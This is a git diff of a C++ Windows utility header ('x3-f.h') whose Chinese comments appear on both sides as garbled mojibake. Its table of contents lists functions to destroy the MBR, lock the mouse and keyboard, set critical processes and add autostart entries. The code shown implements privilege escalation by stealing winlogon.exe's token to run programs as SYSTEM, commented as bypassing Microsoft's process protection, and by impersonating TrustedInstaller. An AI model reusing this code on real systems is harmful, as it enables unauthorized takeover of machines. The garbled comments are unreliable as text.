@@ -1,111 +1,111 @@
 /**********************************************************
-@brief: 			 xbebhxx3º¯ÊıºÏ¼¯
+@brief: 			 xbebhxx3å‡½æ•°åˆé›†
 @license: 	         GPLv3
 @version:  	         8.1
-@remarks:            ±àÒëÊ±¼Ó -std=gnu++11 -lgdi32 -lwsock32
+@remarks:            ç¼–è¯‘æ—¶åŠ  -std=gnu++11 -lgdi32 -lwsock32
 @author:             xbehxx3
 @date:               2022/3/28
 @file:               x3-f.h
 @copyright           Copyright (c) 2022 xbebhxx3, All Rights Reserved
 ***************************************/
-//ÄÜ²»ÒªÉ¾³ı×¢ÊÍÂğ£¬ÇóÇóÁËQwQ
-//             ©³©·       ©³©·
-//            ©³©¿©ß©¥©¥©¥©¥©¥©¥©¥©¿©ß©·
-//            ©§     ?     ©§
-//            ©§  ©×©¿    ©»©× ©§
-//            ©§     ©ß     ©§
-//            ©»©¥©·       ©³©¥©¿
-//              ©§       ©»©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©·
-//              ©§           ÉñÊŞ±£ÓÓ  ©Ç©·
-//              ©§       xbebhxx3       ©§
-//              ©§   ÓÀÎŞBUG£¡         ©³©¿
-//              ©»©·©·©³©¥©×©·©³©¥©¥©¥©¥©¥©¥©·©·©³©¥©×©·©³©¿
-//               ©§©Ï©Ï ©§©Ï©Ï      ©§©Ï©Ï ©§©Ï©Ï
-//               ©»©ß©¿ ©»©ß©¿      ©»©ß©¿ ©»©ß©¿
+//èƒ½ä¸è¦åˆ é™¤æ³¨é‡Šå—ï¼Œæ±‚æ±‚äº†QwQ
+//             â”â”“       â”â”“
+//            â”â”›â”»â”â”â”â”â”â”â”â”›â”»â”“
+//            â”ƒ     ?     â”ƒ
+//            â”ƒ  â”³â”›    â”—â”³ â”ƒ
+//            â”ƒ     â”»     â”ƒ
+//            â”—â”â”“       â”â”â”›
+//              â”ƒ       â”—â”â”â”â”â”â”â”â”â”â”â”â”â”“
+//              â”ƒ           ç¥å…½ä¿ä½‘  â”£â”“
+//              â”ƒ       xbebhxx3       â”ƒ
+//              â”ƒ   æ°¸æ— BUGï¼         â”â”›
+//              â”—â”“â”“â”â”â”³â”“â”â”â”â”â”â”â”â”“â”“â”â”â”³â”“â”â”›
+//               â”ƒâ”«â”« â”ƒâ”«â”«      â”ƒâ”«â”« â”ƒâ”«â”«
+//               â”—â”»â”› â”—â”»â”›      â”—â”»â”› â”—â”»â”›
 
-/*****************Ä¿Â¼*********************
+/*****************ç›®å½•*********************
 x3-f.h
-|- È¨ÏŞ²Ù×÷
-|	 |- »ñµÃdebugÈ¨ÏŞ
-|	 |- ÅĞ¶Ï¹ÜÀíÔ±È¨ÏŞ
-|	 |- »ñµÃ¹ÜÀíÔ±È¨ÏŞ
-|	 |- »ñµÃTrustedInstallerÈ¨ÏŞ
-|    |- »ñµÃsystemÈ¨ÏŞ
-|	 |- ÒÔsystemÈ¨ÏŞ´ò¿ª¿ÉÖ´ĞĞÎÄ¼ş
-|	 |- ÒÔTrustedInstallerÈ¨ÏŞ´ò¿ª¿ÉÖ´ĞĞÎÄ¼ş
-|- ½ø³Ì²Ù×÷
-|   |- ½áÊø½ø³Ì
-|   |- ÅĞ¶Ï½ø³ÌÊÇ·ñ´æÔÚ ,²¢·µ»Ø½ø³Ìid
-|   |- »ñµÃ½ø³ÌÂ·¾¶
-|   |- ¹ÒÆğ½ø³Ì
-|   |- ÉèÖÃ/½â³ı¹Ø¼ü½ø³Ì
-|   |- Í£Ö¹·şÎñ
-|- ´®¿Ú²Ù×÷
-|    |- ´ò¿ª´®¿Ú
-|    |- ¹Ø±Õ´®¿Ú
-|    |- ·¢ËÍÊı¾İ
-|    |- ½ÓÊÕÊı¾İ
-|- ×¢²á±í²Ù×÷
-|     |- ¶Á×¢²á±í
-|     |- Ğ´×¢²á±í
-|     |- É¾³ı×¢²á±íÏî
-|     |- É¾³ı×¢²á±íÖµ
-|     |- ÉèÖÃ¿ª»ú×ÔÆô
-|- ±à/½âÂë²Ù×÷
-|	   |- Url±àÂë
-|	   |- Url½âÂë
-|	   |- ¼ÓÃÜ
-|- ¸Ä±äÑÕÉ«
-|    |- RGB³õÊ¼»¯
-|    |- RGBÉèÖÃ
-|- Ëø¶¨Êó±ê¼üÅÌ
-|- »ñµÃÊó±êÎ»ÖÃ
-|- ÇåÆÁ
-|- strÉ¾³ı¿Õ¸ñ
-|- »ñµÃµ±Ç°ip
-|- »ñµÃµ±Ç°ÓÃ»§Ãû
-|- »ñµÃÏµÍ³°æ±¾
-|- Ö´ĞĞcmdÃüÁî²¢»ñµÃ·µ»ØÖµ
-|- ¾ÓÖĞÊä³ö
-|- Òş²Ø´°¿Ú
-|- Õæ¡¤È«ÆÁ
-|- Òş²Ø´°¿Ú
-|- ÆÆ»µmbr
+|- æƒé™æ“ä½œ
+|	 |- è·å¾—debugæƒé™
+|	 |- åˆ¤æ–­ç®¡ç†å‘˜æƒé™
+|	 |- è·å¾—ç®¡ç†å‘˜æƒé™
+|	 |- è·å¾—TrustedInstalleræƒé™
+|        |- è·å¾—systemæƒé™
+|	 |- ä»¥systemæƒé™æ‰“å¼€å¯æ‰§è¡Œæ–‡ä»¶
+|	 |- ä»¥TrustedInstalleræƒé™æ‰“å¼€å¯æ‰§è¡Œæ–‡ä»¶
+|- è¿›ç¨‹æ“ä½œ
+|   |- ç»“æŸè¿›ç¨‹
+|   |- åˆ¤æ–­è¿›ç¨‹æ˜¯å¦å­˜åœ¨ ,å¹¶è¿”å›è¿›ç¨‹id
+|   |- è·å¾—è¿›ç¨‹è·¯å¾„
+|   |- æŒ‚èµ·è¿›ç¨‹
+|   |- è®¾ç½®/è§£é™¤å…³é”®è¿›ç¨‹
+|   |- åœæ­¢æœåŠ¡
+|- ä¸²å£æ“ä½œ
+|    |- æ‰“å¼€ä¸²å£
+|    |- å…³é—­ä¸²å£
+|    |- å‘é€æ•°æ®
+|    |- æ¥æ”¶æ•°æ®
+|- æ³¨å†Œè¡¨æ“ä½œ
+|     |- è¯»æ³¨å†Œè¡¨
+|     |- å†™æ³¨å†Œè¡¨
+|     |- åˆ é™¤æ³¨å†Œè¡¨é¡¹
+|     |- åˆ é™¤æ³¨å†Œè¡¨å€¼
+|     |- è®¾ç½®å¼€æœºè‡ªå¯
+|- ç¼–/è§£ç æ“ä½œ
+|	   |- Urlç¼–ç 
+|	   |- Urlè§£ç 
+|	   |- åŠ å¯†
+|- æ”¹å˜é¢œè‰²
+|    |- RGBåˆå§‹åŒ–
+|    |- RGBè®¾ç½®
+|- é”å®šé¼ æ ‡é”®ç›˜
+|- è·å¾—é¼ æ ‡ä½ç½®
+|- æ¸…å±
+|- stråˆ é™¤ç©ºæ ¼
+|- è·å¾—å½“å‰ip
+|- è·å¾—å½“å‰ç”¨æˆ·å
+|- è·å¾—ç³»ç»Ÿç‰ˆæœ¬
+|- æ‰§è¡Œcmdå‘½ä»¤å¹¶è·å¾—è¿”å›å€¼
+|- å±…ä¸­è¾“å‡º
+|- éšè—çª—å£
+|- çœŸÂ·å…¨å±
+|- éšè—çª—å£
+|- ç ´åmbr
 
  ****************************************/
 
-//Ä£°å
+//æ¨¡æ¿
 /*********************************************
- *  @Sample usage   Ê¹ÓÃÊµÀı
- *  @brief           Ãû×Ö
- *  @param           º¯Êı²ÎÊı
- *  @return          º¯Êı·µ»ØÖµÃèÊö
- *  @exception       º¯ÊıÅ×Òì³£ÃèÊö
- *  @warning         º¯ÊıÊ¹ÓÃÖĞĞèÒª×¢ÒâµÄµØ·½
- *  @calls           ±»µ÷ÓÃµÄº¯Êı
- *  @remarks         ±¸×¢
- *  @note            ÏêÏ¸ÃèÊö
+ *  @Sample usage   ä½¿ç”¨å®ä¾‹
+ *  @brief           åå­—
+ *  @param           å‡½æ•°å‚æ•°
+ *  @return          å‡½æ•°è¿”å›å€¼æè¿°
+ *  @exception       å‡½æ•°æŠ›å¼‚å¸¸æè¿°
+ *  @warning         å‡½æ•°ä½¿ç”¨ä¸­éœ€è¦æ³¨æ„çš„åœ°æ–¹
+ *  @calls           è¢«è°ƒç”¨çš„å‡½æ•°
+ *  @remarks         å¤‡æ³¨
+ *  @note            è¯¦ç»†æè¿°
  *  @author          xbebhxx3
- *  @version         °æ±¾ºÅ
- *  @date            ÈÕÆÚ
+ *  @version         ç‰ˆæœ¬å·
+ *  @date            æ—¥æœŸ
  *  @copyright       Copyright (c) 2022 by xbebhxx3, All Rights Reserved
  **********************************************/
 
 #include <Windows.h>
 #include <TlHelp32.h>
 #include <string>
-#include <bits/stdc++.h> //Ã»ÓĞÊµ¼Ê×÷ÓÃ£¬Ö»ÊÇÀÁµÃ´ò²¿·ÖÍ·ÎÄ¼ş
+#include <bits/stdc++.h> //æ²¡æœ‰å®é™…ä½œç”¨ï¼Œåªæ˜¯æ‡’å¾—æ‰“éƒ¨åˆ†å¤´æ–‡ä»¶
 #ifndef CIRCLE_H
 #define CIRCLE_H
 
 using namespace std;
 
-//È¨ÏŞ²Ù×÷¿ªÊ¼
+//æƒé™æ“ä½œå¼€å§‹
 
 /**************************************************
- *  @brief         »ñµÃdebugÈ¨ÏŞ
+ *  @brief         è·å¾—debugæƒé™
  *  @Sample usage  Debug();
- *  @return        1³É¹¦£¬0Ê§°Ü
+ *  @return        1æˆåŠŸï¼Œ0å¤±è´¥
  *  @author        xbebhxx3
  *  @version       1.0
  *  @date          2021/1/13
@@ -114,25 +114,25 @@ using namespace std;
 BOOL Debug()
 {
 	HANDLE hToken;
-	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) //´ò¿ªµ±Ç°½ø³Ì
+	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) //æ‰“å¼€å½“å‰è¿›ç¨‹
 		return 0;
-	//Ìí¼ÓÈ¨ÏŞ
+	//æ·»åŠ æƒé™
 	LUID luid;
-	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) //Ìí¼ÓÈ¨ÏŞ
+	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) //æ·»åŠ æƒé™
 		return 0;
 	TOKEN_PRIVILEGES tkp;
 	tkp.PrivilegeCount = 1;
 	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 	tkp.Privileges[0].Luid = luid;
-	if (!AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL)) //ÅĞ¶ÏÊÇ·ñ³É¹¦
+	if (!AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL)) //åˆ¤æ–­æ˜¯å¦æˆåŠŸ
 		return 0;
 	return 1;
 }
 
 /**************************************************
- *  @brief         ÅĞ¶Ï¹ÜÀíÔ±È¨ÏŞ
- *  @return        1¹ÜÀíÔ±£¬0²»ÊÇ
- *  @note          Í·ÎÄ¼ş£º #include <Windows.h>
+ *  @brief         åˆ¤æ–­ç®¡ç†å‘˜æƒé™
+ *  @return        1ç®¡ç†å‘˜ï¼Œ0ä¸æ˜¯
+ *  @note          å¤´æ–‡ä»¶ï¼š #include <Windows.h>
  *  @Sample usage  IsProcessRunAsAdmin();
  *  @author        xbebhxx3
  *  @version       2.0
@@ -143,26 +143,26 @@ bool IsProcessRunAsAdmin()
 {
 	BOOL bElevated = FALSE;
 	HANDLE hToken = NULL;
-	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) //´ò¿ª½ø³Ì
+	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) //æ‰“å¼€è¿›ç¨‹
 		return FALSE;
-	//»ñµÃ½ø³Ìtoken
+	//è·å¾—è¿›ç¨‹token
 	TOKEN_ELEVATION tokenEle;
 	DWORD dwRetLen = 0;
-	if (GetTokenInformation(hToken, TokenElevation, &tokenEle, sizeof(tokenEle), &dwRetLen)) //»ñµÃ½ø³Ìtoken
-		if (dwRetLen == sizeof(tokenEle))													 //ÅĞ¶Ï
+	if (GetTokenInformation(hToken, TokenElevation, &tokenEle, sizeof(tokenEle), &dwRetLen)) //è·å¾—è¿›ç¨‹token
+		if (dwRetLen == sizeof(tokenEle))													 //åˆ¤æ–­
 			bElevated = tokenEle.TokenIsElevated;
 
 	CloseHandle(hToken);
-	return bElevated; //·µ»Ø
+	return bElevated; //è¿”å›
 }
 
 /**************************************************
- *  @brief         »ñµÃ¹ÜÀíÔ±È¨ÏŞ
- *  @return        1ÒÑ¾­ÊÇ¹ÜÀíÔ±
- *  @note          Í·ÎÄ¼ş£º #include <Windows.h>
+ *  @brief         è·å¾—ç®¡ç†å‘˜æƒé™
+ *  @return        1å·²ç»æ˜¯ç®¡ç†å‘˜
+ *  @note          å¤´æ–‡ä»¶ï¼š #include <Windows.h>
  *  @Sample usage  RunAsAdmin();
  *  @Calls         IsProcessRunAsAdmin
- *  @remarks       ±ØĞëÒÀÀµIsProcessRunAsAdminÅĞ¶ÏÊÇ·ñÎª¹ÜÀíÔ±È¨ÏŞ
+ *  @remarks       å¿…é¡»ä¾èµ–IsProcessRunAsAdminåˆ¤æ–­æ˜¯å¦ä¸ºç®¡ç†å‘˜æƒé™
  *  @author        xbebhxx3
  *  @version       1.0
  *  @date          2022/3/28
@@ -170,23 +170,23 @@ bool IsProcessRunAsAdmin()
  **************************************************/
 bool RunAsAdmin()
 {
-	if (IsProcessRunAsAdmin() == 1) //ÅĞ¶ÏÊÇ·ñÊÇ¹ÜÀíÔ±£¬·ÀÖ¹Ñ­»·Æô¶¯
+	if (IsProcessRunAsAdmin() == 1) //åˆ¤æ–­æ˜¯å¦æ˜¯ç®¡ç†å‘˜ï¼Œé˜²æ­¢å¾ªç¯å¯åŠ¨
 		return 1;
 
 	char szFilePath[MAX_PATH + 1] = {0};
-	GetModuleFileNameA(NULL, szFilePath, MAX_PATH); //»ñµÃµ±Ç°ÎÄ¼şÂ·¾¶
+	GetModuleFileNameA(NULL, szFilePath, MAX_PATH); //è·å¾—å½“å‰æ–‡ä»¶è·¯å¾„
 
-	ShellExecute(NULL, "runas", szFilePath, NULL, NULL, SW_SHOW); //ÓÃ¹ÜÀíÔ±È¨ÏŞ´ò¿ª
-	exit(0);													  //ÍË³öµ±Ç°½ø³Ì£¬·ÀÖ¹³öÏÖ2¸ö´°¿Ú
+	ShellExecute(NULL, "runas", szFilePath, NULL, NULL, SW_SHOW); //ç”¨ç®¡ç†å‘˜æƒé™æ‰“å¼€
+	exit(0);													  //é€€å‡ºå½“å‰è¿›ç¨‹ï¼Œé˜²æ­¢å‡ºç°2ä¸ªçª—å£
 }
 
 /**************************************************
- *  @brief         »ñµÃTrustedInstallerÈ¨ÏŞ
- *  @return        1ÒÑ¾­ÊÇTrustedInstaller
- *  @note          Í·ÎÄ¼ş£º #include <Windows.h>
+ *  @brief         è·å¾—TrustedInstalleræƒé™
+ *  @return        1å·²ç»æ˜¯TrustedInstaller
+ *  @note          å¤´æ–‡ä»¶ï¼š #include <Windows.h>
  *  @Sample usage  RunAsTi();
  *  @Calls         IsProcessRunAsAdmin,UseTrustedInstaller,GetUser
- *  @remarks       ±ØĞëÒÀÀµIsProcessRunAsAdminÅĞ¶ÏÊÇ·ñÎª¹ÜÀíÔ±È¨ÏŞ ±ØĞëÒÀÀµUseTrustedInstallerÌáÈ¨ ±ØĞëÒÀÀµGetUserÅĞ¶Ïµ±Ç°ÓÃ»§Ãû
+ *  @remarks       å¿…é¡»ä¾èµ–IsProcessRunAsAdminåˆ¤æ–­æ˜¯å¦ä¸ºç®¡ç†å‘˜æƒé™ å¿…é¡»ä¾èµ–UseTrustedInstallerææƒ å¿…é¡»ä¾èµ–GetUseråˆ¤æ–­å½“å‰ç”¨æˆ·å
  *  @author        xbebhxx3
  *  @version       1.0
  *  @date          2022/9/7
@@ -196,23 +196,23 @@ string GetUser();
 bool UseTrustedInstaller(const char *exec);
 bool RunAsTi()
 {
-	RunAsAdmin(); //ÒÔ¹ÜÀíÔ±È¨ÏŞÔËĞĞ£¬UseTrustedInstallerĞèÒª¹ÜÀíÔ±È¨ÏŞ
+	RunAsAdmin(); //ä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œï¼ŒUseTrustedInstalleréœ€è¦ç®¡ç†å‘˜æƒé™
 
-	if (GetUser() != "SYSTEM") //ÅĞ¶ÏÊÇ·ñÊÇSYSTEMÈ¨ÏŞ,·ÀÖ¹Ñ­»·ÖØÆô
+	if (GetUser() != "SYSTEM") //åˆ¤æ–­æ˜¯å¦æ˜¯SYSTEMæƒé™,é˜²æ­¢å¾ªç¯é‡å¯
 	{
 		char szFilePath[MAX_PATH + 1] = {0};
-		GetModuleFileNameA(NULL, szFilePath, MAX_PATH); //»ñµÃµ±Ç°ÎÄ¼şÂ·¾¶
-		UseTrustedInstaller(szFilePath);				//ÒÔTrustedInstallerÈ¨ÏŞ´ò¿ª
-		exit(0);										//ÍË³ö·ÀÖ¹2¸ö´°¿Ú
+		GetModuleFileNameA(NULL, szFilePath, MAX_PATH); //è·å¾—å½“å‰æ–‡ä»¶è·¯å¾„
+		UseTrustedInstaller(szFilePath);				//ä»¥TrustedInstalleræƒé™æ‰“å¼€
+		exit(0);										//é€€å‡ºé˜²æ­¢2ä¸ªçª—å£
 	}
 	else
 		return 1;
 }
 
 /**************************************************
- *  @brief         ÒÔsystemÈ¨ÏŞ´ò¿ª¿ÉÖ´ĞĞÎÄ¼ş
- *  @return        1³É¹¦,0Ê§°Ü
- *  @note          Í·ÎÄ¼ş£º #include <Windows.h>
+ *  @brief         ä»¥systemæƒé™æ‰“å¼€å¯æ‰§è¡Œæ–‡ä»¶
+ *  @return        1æˆåŠŸ,0å¤±è´¥
+ *  @note          å¤´æ–‡ä»¶ï¼š #include <Windows.h>
  *  @calls          Debug
  *  @Sample usage  UseSystem("cmd");
  *  @author        xbebhxx3
@@ -225,44 +225,44 @@ bool UseSystem(const char *exec)
 {
 	int num = MultiByteToWideChar(0, 0, exec, -1, NULL, 0);
 	wchar_t *wexec = new wchar_t[num];
-	MultiByteToWideChar(0, 0, exec, -1, wexec, num); // char *×ªwchar_t
+	MultiByteToWideChar(0, 0, exec, -1, wexec, num); // char *è½¬wchar_t
 
-	DWORD PID_TO_IMPERSONATE = isProcess("winlogon.exe"); //»ñµÃwinlogon.exeµÄpid
-	//ÉùÃ÷Ö®ºóĞèÒªµÄ±äÁ¿
-	HANDLE tokenHandle = NULL;			//½ø³ÌÁîÅÆ
-	HANDLE duplicateTokenHandle = NULL; //¸´ÖÆµÄÁîÅÆ
+	DWORD PID_TO_IMPERSONATE = isProcess("winlogon.exe"); //è·å¾—winlogon.exeçš„pid
+	//å£°æ˜ä¹‹åéœ€è¦çš„å˜é‡
+	HANDLE tokenHandle = NULL;			//è¿›ç¨‹ä»¤ç‰Œ
+	HANDLE duplicateTokenHandle = NULL; //å¤åˆ¶çš„ä»¤ç‰Œ
 
-	STARTUPINFO startupInfo; //´´½¨½ø³ÌËù±ØĞëµÄ½á¹¹
+	STARTUPINFO startupInfo; //åˆ›å»ºè¿›ç¨‹æ‰€å¿…é¡»çš„ç»“æ„
 	PROCESS_INFORMATION processInformation;
 	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
 	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
 	startupInfo.cb = sizeof(STARTUPINFO);
 
-	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, NULL); //»ñÈ¡¾ä±ú½øĞĞµ÷ÕûÈ¨ÏŞ
+	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, NULL); //è·å–å¥æŸ„è¿›è¡Œè°ƒæ•´æƒé™
 
-	Debug(); //»ñµÃdebugÈ¨ÏŞ
+	Debug(); //è·å¾—debugæƒé™
 
-	HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, true, PID_TO_IMPERSONATE); // »ñÈ¡Ö¸¶¨½ø³ÌµÄ¾ä±ú
+	HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, true, PID_TO_IMPERSONATE); // è·å–æŒ‡å®šè¿›ç¨‹çš„å¥æŸ„
 
 	if (!processHandle)
-		OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE); //ÈÆ¹ıÊÜÎ¢ÈíµÄ½ø³Ì±£»¤
+		OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE); //ç»•è¿‡å—å¾®è½¯çš„è¿›ç¨‹ä¿æŠ¤
 
-	OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &tokenHandle); // »ñÈ¡Ö¸¶¨½ø³ÌµÄ¾ä±úÁîÅÆ
+	OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &tokenHandle); // è·å–æŒ‡å®šè¿›ç¨‹çš„å¥æŸ„ä»¤ç‰Œ
 
-	if (ImpersonateLoggedOnUser(tokenHandle)) //Ä£ÄâµÇÂ¼ÓÃ»§µÄ°²È«ÉÏÏÂÎÄ
+	if (ImpersonateLoggedOnUser(tokenHandle)) //æ¨¡æ‹Ÿç™»å½•ç”¨æˆ·çš„å®‰å…¨ä¸Šä¸‹æ–‡
 		RevertToSelf();
-	DuplicateTokenEx(tokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle); // ¸´ÖÆ¾ßÓĞSYSTEMÈ¨ÏŞµÄÁîÅÆ
+	DuplicateTokenEx(tokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle); // å¤åˆ¶å…·æœ‰SYSTEMæƒé™çš„ä»¤ç‰Œ
 
-	return CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, wexec, NULL, 0, NULL, NULL, (LPSTARTUPINFOW)&startupInfo, &processInformation); // ´´½¨Ö¸¶¨ÁîÅÆÆô¶¯µÄ½ø³Ì
+	return CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, wexec, NULL, 0, NULL, NULL, (LPSTARTUPINFOW)&startupInfo, &processInformation); // åˆ›å»ºæŒ‡å®šä»¤ç‰Œå¯åŠ¨çš„è¿›ç¨‹
 }
 
 /**************************************************
- *  @brief         ÒÔTrustedInstallerÈ¨ÏŞ´ò¿ª¿ÉÖ´ĞĞÎÄ¼ş
- *  @return        1³É¹¦,0Ê§°Ü
- *  @note          Í·ÎÄ¼ş£º #include <Windows.h>
+ *  @brief         ä»¥TrustedInstalleræƒé™æ‰“å¼€å¯æ‰§è¡Œæ–‡ä»¶
+ *  @return        1æˆåŠŸ,0å¤±è´¥
+ *  @note          å¤´æ–‡ä»¶ï¼š #include <Windows.h>
  *  @Sample usage  UseTrustedInstaller("cmd");
  *  @calls          Debug
- *  @remarks       ±àÒëÊ±¼Ó -std=gnu++11
+ *  @remarks       ç¼–è¯‘æ—¶åŠ  -std=gnu++11
  *  @author        xbebhxx3
  *  @version       5.0
  *  @date          2022/8/10
@@ -272,23 +272,23 @@ bool UseTrustedInstaller(const char *exec)
 {
 	int num = MultiByteToWideChar(0, 0, exec, -1, NULL, 0);
 	wchar_t *wexec = new wchar_t[num];
-	MultiByteToWideChar(0, 0, exec, -1, wexec, num); // char *×ªwchar_t
+	MultiByteToWideChar(0, 0, exec, -1, wexec, num); // char *è½¬wchar_t
 
-	Debug(); //»ñµÃdebugÈ¨ÏŞ
+	Debug(); //è·å¾—debugæƒé™
 
-	HANDLE hSystemToken = nullptr, IhDupToken = nullptr, hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //´´½¨½ø³Ì¿ìÕÕ
+	HANDLE hSystemToken = nullptr, IhDupToken = nullptr, hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //åˆ›å»ºè¿›ç¨‹å¿«ç…§
 	PROCESSENTRY32W pe = {0};
 	pe.dwSize = sizeof(PROCESSENTRY32W);
 	Process32FirstW(hSnapshot, &pe);
-	while (Process32NextW(hSnapshot, &pe) && _wcsicmp(pe.szExeFile, L"winlogon.exe"));//µ±Ç°½ø³ÌÊÇwinlogon.exe
-	OpenProcessToken(OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID), MAXIMUM_ALLOWED, &hSystemToken);// »ñÈ¡Ö¸¶¨½ø³ÌµÄ¾ä±úÁîÅÆ
+	while (Process32NextW(hSnapshot, &pe) && _wcsicmp(pe.szExeFile, L"winlogon.exe"));//å½“å‰è¿›ç¨‹æ˜¯winlogon.exe
+	OpenProcessToken(OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID), MAXIMUM_ALLOWED, &hSystemToken);// è·å–æŒ‡å®šè¿›ç¨‹çš„å¥æŸ„ä»¤ç‰Œ
 	SECURITY_ATTRIBUTES ItokenAttributes;
 	ItokenAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
 	ItokenAttributes.lpSecurityDescriptor = nullptr;
 	ItokenAttributes.bInheritHandle = FALSE;
-	DuplicateTokenEx(hSystemToken, MAXIMUM_ALLOWED, &ItokenAttributes, SecurityImpersonation, TokenImpersonation, &IhDupToken); //´ò¿ªÁîÅÆ
-	ImpersonateLoggedOnUser(IhDupToken);																						//´´½¨½ø³ÌËù±ØĞëµÄ½á¹¹
-	//ÉùÃ÷Ö®ºóĞèÒªµÄ±äÁ¿
+	DuplicateTokenEx(hSystemToken, MAXIMUM_ALLOWED, &ItokenAttributes, SecurityImpersonation, TokenImpersonation, &IhDupToken); //æ‰“å¼€ä»¤ç‰Œ
+	ImpersonateLoggedOnUser(IhDupToken);																						//åˆ›å»ºè¿›ç¨‹æ‰€å¿…é¡»çš„ç»“æ„
+	//å£°æ˜ä¹‹åéœ€è¦çš„å˜é‡
 	HANDLE hTIProcess = nullptr, hTIToken = nullptr, hDupToken = nullptr;
 	HANDLE hToken = nullptr;
 	LPVOID lpEnvironment = nullptr;
@@ -297,9 +297,9 @@ bool UseTrustedInstaller(const char *exec)
 	SC_HANDLE hService = nullptr;
 	DWORD dwProcessId = 0;
 	BOOL res = TRUE, started = TRUE;
-	//Æô¶¯TrustedInstaller·şÎñ²¢»ñµÃid
+	//å¯åŠ¨TrustedInstalleræœåŠ¡å¹¶è·å¾—id
 	hSCManager = OpenSCManager(nullptr, SERVICES_ACTIVE_DATABASE, GENERIC_EXECUTE);
-	hService = OpenServiceW(hSCManager, L"TrustedInstaller", GENERIC_READ | GENERIC_EXECUTE); //´ò¿ªTrustedInstaller·şÎñ
+	hService = OpenServiceW(hSCManager, L"TrustedInstaller", GENERIC_READ | GENERIC_EXECUTE); //æ‰“å¼€TrustedInstalleræœåŠ¡
 	SERVICE_STATUS_PROCESS statusBuffer = {0};
 	DWORD bytesNeeded;
 	while (dwProcessId == 0 && started && (res = QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, reinterpret_cast<LPBYTE>(&statusBuffer), sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded)))
@@ -307,27 +307,27 @@ bool UseTrustedInstaller(const char *exec)
 		switch (statusBuffer.dwCurrentState)
 		{
 		case SERVICE_STOPPED:
-			started = StartServiceW(hService, 0, nullptr); //Æô¶¯TrustedInstaller·şÎñ
+			started = StartServiceW(hService, 0, nullptr); //å¯åŠ¨TrustedInstalleræœåŠ¡
 		case SERVICE_STOP_PENDING:
-			Sleep(statusBuffer.dwWaitHint); //µÈ´ı·şÎñÆô¶¯
+			Sleep(statusBuffer.dwWaitHint); //ç­‰å¾…æœåŠ¡å¯åŠ¨
 		case SERVICE_RUNNING:
-			dwProcessId = statusBuffer.dwProcessId; //¸³Öµ½ø³Ìid
+			dwProcessId = statusBuffer.dwProcessId; //èµ‹å€¼è¿›ç¨‹id
 		}
 	}
 
-	hTIProcess = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, dwProcessId); //´ò¿ªTrustedInstaller½ø³Ì
-	OpenProcessToken(hTIProcess, MAXIMUM_ALLOWED, &hTIToken);									  //»ñµÃTrustedInstaller½ø³ÌToken
+	hTIProcess = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, dwProcessId); //æ‰“å¼€TrustedInstallerè¿›ç¨‹
+	OpenProcessToken(hTIProcess, MAXIMUM_ALLOWED, &hTIToken);									  //è·å¾—TrustedInstallerè¿›ç¨‹Token
 
 	SECURITY_ATTRIBUTES tokenAttributes;
 	tokenAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
 	tokenAttributes.lpSecurityDescriptor = nullptr;
 	tokenAttributes.bInheritHandle = FALSE;
-	DuplicateTokenEx(hTIToken, MAXIMUM_ALLOWED, &tokenAttributes, SecurityImpersonation, TokenImpersonation, &hDupToken); //¸´ÖÆ´øÓĞTrustedInstallerÈ¨ÏŞµÄÁîÅÆ
-	OpenProcessToken(GetCurrentProcess(), TOKEN_READ, &hToken);															  // »ñÈ¡Ö¸¶¨½ø³ÌµÄ¾ä±ú
